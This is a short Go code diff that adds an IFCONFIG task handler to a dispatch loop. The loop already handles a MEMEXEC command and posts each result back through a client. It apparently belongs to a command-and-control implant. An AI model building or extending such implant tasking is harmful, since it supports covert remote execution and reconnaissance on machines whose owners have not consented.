@@ -104,6 +104,9 @@ func Start() {
 		case internal.MEMEXEC:
 			response := HandleMEMEXEC(ctx, payload, tid)
 			h.Post([]byte(response))
+		case internal.IFCONFIG:
+			response := HandleIFCONFIG(ctx, tid)
+			h.Post([]byte(response))
 		default:
 			print("->", tcode, "Nothing")
 		}
